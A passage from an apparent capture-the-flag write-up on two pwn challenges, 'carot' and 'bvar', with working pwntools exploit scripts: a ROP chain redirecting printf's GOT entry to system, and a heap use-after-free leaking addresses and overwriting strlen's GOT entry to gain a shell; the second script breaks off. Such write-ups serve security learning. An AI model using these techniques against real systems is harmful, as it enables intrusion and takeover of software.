<span class="n">p</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">11452</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">setblocking</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
<span class="k">try</span><span class="p">:</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">s</span><span class="p">:</span>
      <span class="k">break</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="n">s</span>
<span class="k">except</span><span class="p">:</span>
  <span class="k">pass</span>

<span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</code></pre></div></div>
<p>Lets check protections enabled.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre></div></div>
<p>No PIE and NX hint at a ROP challenge, GOT is not writeable and there’s no canary.<br />
Now it’s pretty clear that it’s a ROP challenge. But, because we don’t have direct interaction with the binary we can’t do a simple <code class="language-plaintext highlighter-rouge">ret2libc</code> attack. We need to build something like that using the existing gadgets.<br />
Following are the gadgets I used:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pop_rbp</span>                <span class="o">=</span> <span class="mh">0x400828</span>
<span class="n">pop_rdi</span>                <span class="o">=</span> <span class="mh">0x4010d3</span>
<span class="n">pop_rbx_pop_rbp_pop_4</span>  <span class="o">=</span> <span class="mh">0x4010ca</span>
<span class="n">pop_rsi_pop_r15</span>        <span class="o">=</span> <span class="mh">0x4010d1</span>

<span class="n">ret</span>                    <span class="o">=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="mi">1</span>

<span class="n">mov_rax_qword_rbp_8</span>    <span class="o">=</span> <span class="mh">0x400b7d</span>
<span class="n">mov_qword_rbp_0x30_rax</span> <span class="o">=</span> <span class="mh">0x400cae</span>

<span class="n">add_dword_rbp_0x3d_ebx</span> <span class="o">=</span> <span class="mh">0x400888</span>

<span class="n">jmp_qword_rbp</span>          <span class="o">=</span> <span class="mh">0x4014fb</span>
</code></pre></div></div>
<p>The whole idea behind my ROP chain is to read address of <code class="language-plaintext highlighter-rouge">printf</code> to a writeable area, increment it to make it <code class="language-plaintext highlighter-rouge">system</code> address, read a string for argument of <code class="language-plaintext highlighter-rouge">system</code> then call system with the string.<br />
pseudo-code below:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rax = qword ptr [printf's GOT]

rbx = system - printf
rbp = &amp;gif - 8

[rbp] = rax             // write printf address
[&amp;gif - 8] += rbx       // increment

scanf("%[^\n]", &amp;gif)   // read the command

rdi = &amp;gif
rbp = &amp;gif - 8

jmp [rbp]              // system(&amp;gif)
</code></pre></div></div>
<p>My exploit:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'167.99.78.201'</span><span class="p">,</span> <span class="mi">11451</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./carot'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.31.so'</span><span class="p">)</span>

<span class="n">pop_rbp</span>                <span class="o">=</span> <span class="mh">0x400828</span>
<span class="n">pop_rdi</span>                <span class="o">=</span> <span class="mh">0x4010d3</span>
<span class="n">pop_rbx_pop_rbp_pop_4</span>  <span class="o">=</span> <span class="mh">0x4010ca</span>
<span class="n">pop_rsi_pop_r15</span>        <span class="o">=</span> <span class="mh">0x4010d1</span>

<span class="n">ret</span>                    <span class="o">=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="mi">1</span>

<span class="n">mov_rax_qword_rbp_8</span>    <span class="o">=</span> <span class="mh">0x400b7d</span>
<span class="n">mov_qword_rbp_0x30_rax</span> <span class="o">=</span> <span class="mh">0x400cae</span>

<span class="n">add_dword_rbp_0x3d_ebx</span> <span class="o">=</span> <span class="mh">0x400888</span>

<span class="n">jmp_qword_rbp</span>          <span class="o">=</span> <span class="mh">0x4014fb</span>

<span class="n">junk</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">'JUNKJUNK'</span><span class="p">)</span>

<span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
    <span class="n">pop_rbp</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">printf</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span>
    <span class="n">mov_rax_qword_rbp_8</span><span class="p">,</span>
    <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span>

    <span class="n">pop_rbx_pop_rbp_pop_4</span><span class="p">,</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">printf</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">gif</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">,</span>
    <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span>

    <span class="n">mov_qword_rbp_0x30_rax</span><span class="p">,</span>
    <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span> <span class="n">junk</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">gif</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">+</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="c1"># rbp
</span>
    <span class="n">add_dword_rbp_0x3d_ebx</span><span class="p">,</span>

    <span class="n">pop_rdi</span><span class="p">,</span> <span class="mh">0x4012f0</span><span class="p">,</span>
    <span class="n">pop_rsi_pop_r15</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">gif</span><span class="p">,</span>
    <span class="n">junk</span><span class="p">,</span>

    <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">.</span><span class="n">__isoc99_scanf</span><span class="p">,</span>

    <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">gif</span><span class="p">,</span>
    <span class="n">pop_rbp</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">gif</span> <span class="o">-</span> <span class="mi">8</span><span class="p">,</span>
    <span class="n">ret</span><span class="p">,</span>
    <span class="n">jmp_qword_rbp</span>
<span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ropchain</span><span class="p">])</span>

<span class="n">start</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">536</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'cat flag.txt'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{buriburi_1d3dfb9bf7654412}</code></p>

<h1 id="bvar---380-pts---22-solves">bvar - 380 pts - 22 solves</h1>
<p>Relevant code below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="k">struct</span> <span class="n">node_data</span><span class="p">{</span>
	<span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mh">0x8</span><span class="p">];</span>
	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x4</span><span class="p">];</span>
<span class="p">};</span>
<span class="k">struct</span> <span class="n">node</span><span class="p">{</span>
	<span class="k">struct</span> <span class="n">node_data</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">char</span> <span class="n">c_memory</span><span class="p">[</span><span class="mi">1000</span><span class="p">];</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">c_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="kt">char</span><span class="o">*</span> <span class="n">freelist</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">free_head</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>


<span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">head</span><span class="p">;</span>
<span class="k">struct</span> <span class="n">node_data</span> <span class="o">*</span><span class="n">temp_memory</span><span class="p">;</span>


<span class="kt">char</span><span class="o">*</span> <span class="nf">c_malloc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">){</span>
	<span class="kt">int</span> <span class="n">temp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span>
		<span class="n">size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">c_size</span> <span class="o">+</span> <span class="p">(</span><span class="n">size</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">999</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"No Space :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">if</span><span class="p">(</span><span class="n">free_head</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
		<span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">size</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
		<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c_memory</span><span class="p">[</span><span class="n">c_size</span><span class="p">],</span><span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
		<span class="n">temp</span> <span class="o">=</span> <span class="n">c_size</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
		<span class="n">c_size</span> <span class="o">+=</span> <span class="p">(</span><span class="n">size</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">&amp;</span><span class="n">c_memory</span><span class="p">[</span><span class="n">temp</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="k">else</span><span class="p">{</span>
		<span class="k">return</span> <span class="n">freelist</span><span class="p">[</span><span class="o">--</span><span class="n">free_head</span><span class="p">];</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">c_free</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="n">free_head</span><span class="o">==</span><span class="mi">10</span><span class="p">)</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="n">freelist</span><span class="p">[</span><span class="n">free_head</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span> 
<span class="p">}</span>

<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>

<span class="n">init</span><span class="p">();</span>
<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x18</span><span class="p">);</span>	
	<span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x9</span><span class="p">);</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x5</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">);</span>
	<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span>
		<span class="n">input</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\x00'</span><span class="p">;</span>
	<span class="n">split</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="sc">'='</span><span class="p">);</span>
<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>

	<span class="k">else</span><span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="s">"delete"</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="mi">6</span><span class="p">)){</span>
			<span class="k">for</span><span class="p">(</span><span class="n">temp</span><span class="o">=</span><span class="n">head</span><span class="p">;</span> <span class="n">temp</span><span class="o">!=</span><span class="nb">NULL</span><span class="p">;</span> <span class="n">temp</span><span class="o">=</span><span class="n">temp</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">){</span>
				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">temp</span><span class="o">-&gt;</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="o">&amp;</span><span class="n">input</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span><span class="mi">4</span><span class="p">)){</span>
					<span class="k">if</span><span class="p">(</span><span class="n">temp</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">)</span>
						<span class="n">temp</span><span class="o">-&gt;</span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">temp</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
					<span class="k">if</span><span class="p">(</span><span class="n">temp</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span>
						<span class="n">temp</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">temp</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>
					<span class="n">c_free</span><span class="p">(</span><span class="n">temp</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
					<span class="n">c_free</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
					<span class="n">printf</span><span class="p">(</span><span class="s">"delete!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
					<span class="k">break</span><span class="p">;</span>
				<span class="p">}</span>
			<span class="p">}</span>
		<span class="p">}</span>
<span class="p">[</span><span class="n">redacted</span><span class="p">]</span>
</code></pre></div></div>
<p>This program stores pairs of <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">data</code> using custom heap-like functionality. The <code class="language-plaintext highlighter-rouge">name</code> can be of 4 bytes and data can be of 8 bytes at maximum. The pairs are stored in a doubly-linked list using <code class="language-plaintext highlighter-rouge">node</code> and <code class="language-plaintext highlighter-rouge">node_data</code> structs. It lets us <code class="language-plaintext highlighter-rouge">add</code>, <code class="language-plaintext highlighter-rouge">delete</code>, <code class="language-plaintext highlighter-rouge">clear</code> the head, <code class="language-plaintext highlighter-rouge">edit</code> and <code class="language-plaintext highlighter-rouge">print</code> node and its data.<code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">data</code> need to be separated by <code class="language-plaintext highlighter-rouge">=</code>.<br />
Analyzing the program reveals two issues:<br /></p>
<ol>
  <li>The freelist is same for all sizes. (<em>size is just a number</em>)</li>
  <li>When we delete the <code class="language-plaintext highlighter-rouge">head</code> node, <code class="language-plaintext highlighter-rouge">head</code> pointer is not cleared.<br /></li>
</ol>

<p>So, when we free the <code class="language-plaintext highlighter-rouge">head</code> node and add a new node, because of LIFO, the <code class="language-plaintext highlighter-rouge">node_data</code> of head becomes <code class="language-plaintext highlighter-rouge">node</code> and <code class="language-plaintext highlighter-rouge">node</code> becomes <code class="language-plaintext highlighter-rouge">node_data</code> of the new node. <code class="language-plaintext highlighter-rouge">name</code> of new node is written in the <code class="language-plaintext highlighter-rouge">next</code> area of <code class="language-plaintext highlighter-rouge">head</code> and since name is read using <code class="language-plaintext highlighter-rouge">read</code>, no null-byte termination.<br />
This lets us control which values will be checked for further operations when the list is traversed.<br />
Lets check protections enabled:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre></div></div>
<p>PIE is enabled and RELRO is disabled. So, we will most likely do a GOT overwrite, but for that we need a binary leak.<br />
Since, the heap-like implementation is in bss, so, leaking a pointer from one of the structures will give us a binary leak.<br />
For leak, I overwrote the <code class="language-plaintext highlighter-rouge">next</code> pointer’s lsb to <code class="language-plaintext highlighter-rouge">0xc8</code>, which points to <code class="language-plaintext highlighter-rouge">data</code> of new node. Since, new node’s <code class="language-plaintext highlighter-rouge">next</code> is null, sending an empty string will match with it and return the <code class="language-plaintext highlighter-rouge">data</code> pointer using the printing mechanism.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x55e6239f5508: 0x000055e6239f5594     &lt;---- head

gef➤  x/2gx 0x000055e6239f5594
0x55e6239f5594: 0x000055e6239f55c0      0x000055e6239f55c8   &lt;---- data and next of 
                                                            head node and data and 
                                                            name of new node
gef➤  x/2gx 0x000055e6239f55c8
0x55e6239f55c8: 0x000055e6239f5584      0x0000000000000000   &lt;---- data and name 
                                                            of head and data and
                                                            next of new node
</code></pre></div></div>
<p>This gives <code class="language-plaintext highlighter-rouge">0x000055e6239f5584</code>.<br />
But, for properly using the GOT overwrite, we need a libc leak also.<br />
I cleared the <code class="language-plaintext highlighter-rouge">head</code> and repeated the same mechanism for libc leak using <code class="language-plaintext highlighter-rouge">exit</code>’s GOT because it was last in the list of GOT but with <code class="language-plaintext highlighter-rouge">0x08</code> for the overwrite. This way I get <code class="language-plaintext highlighter-rouge">exit</code>’s address and calculate libc base using it.<br />
Finally, time for the overwrite. I decided to do overwrite <code class="language-plaintext highlighter-rouge">strlen</code>’s GOT because it was the first function our input was fed into and has a signature like system.<br />
Once again, cleared the <code class="language-plaintext highlighter-rouge">head</code>, created two nodes; second one with address of <code class="language-plaintext highlighter-rouge">GOT of strlen - 8</code> because the edit function lets us edit 4 bytes of <code class="language-plaintext highlighter-rouge">name</code> only. That’s enough because the upper 4 bytes are same for all libc addresses, Freed the <code class="language-plaintext highlighter-rouge">head</code>, created a new node, overwrote lsb with <code class="language-plaintext highlighter-rouge">0x60</code> which points to the the location of <code class="language-plaintext highlighter-rouge">GOT of strlen - 8</code>, send <code class="language-plaintext highlighter-rouge">edit</code> with lower 4 bytes of <code class="language-plaintext highlighter-rouge">strlen</code> then edit <code class="language-plaintext highlighter-rouge">strlen</code> to <code class="language-plaintext highlighter-rouge">system</code>. Then simply sending <code class="language-plaintext highlighter-rouge">/bin/sh</code> gives shell.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x55713605a508: 0x000055713605a644     &lt;---- head

gef➤  x/2gx 0x000055713605a644
0x55713605a644: 0x000055713605a670      0x000055713605a660   &lt;---- data and next of 
                                                            head node and data and 
                                                            name of new node
gef➤  x/2gx 0x000055713605a660
0x55713605a660: 0x000055713605a428      0x0000001c31323334   &lt;---- data and name 
                                                            of head and data and
                                                            next of new node
gef➤  x/gx 0x000055713605a428
0x55713605a428 &lt;puts@got.plt&gt;:          0x00007f23ab24c5a0
0x55713605a430 &lt;strlen@got.plt&gt;:        0x00007f23ab279d30   &lt;--- target
</code></pre></div></div>
<p>There was one small issue with this approach. <code class="language-plaintext highlighter-rouge">strlen</code> is a function having different implementations (ifunc) in libc which are used based upon the system libc is running on. For some reason, different implementations were used on my machine and the remote server.<br />
To get the specific implemention, I leaked the <code class="language-plaintext highlighter-rouge">strlen</code>’s address on remote using the same leaking mechanism because after <code class="language-plaintext highlighter-rouge">strlen</code> there’s is <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code>’s GOT which is same on my machine and remote server. Then simple offset calculation.<br />
Final exploit below:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'167.99.78.201'</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span> <span class="o">+</span> <span class="s">":./ld-2.31.so"</span><span class="p">})</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">name</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'='</span> <span class="o">+</span> <span class="n">data</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">name</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'delete '</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">new_name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'edit '</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">new_name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">clear</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="s">'clear'</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./bvar_patched'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.31.so'</span><span class="p">)</span>
<span class="n">start</span><span class="p">()</span>

<span class="n">a</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'1234'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'test1'</span><span class="p">)</span>
<span class="n">b</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'4321'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'test2'</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">c</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\xc8</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'hack'</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="sa">b</span><span class="s">''</span><span class="p">)</span>
<span class="n">binary_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">binary_leak</span> <span class="o">-</span> <span class="mh">0x3594</span>

<span class="n">clear</span><span class="p">()</span>

<span class="n">a</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'1234'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'test1'</span><span class="p">)</span>
<span class="n">b</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'4321'</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="nb">exit</span><span class="p">))</span>
<span class="n">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">c</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x08</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'hack'</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="sa">b</span><span class="s">''</span><span class="p">)</span>
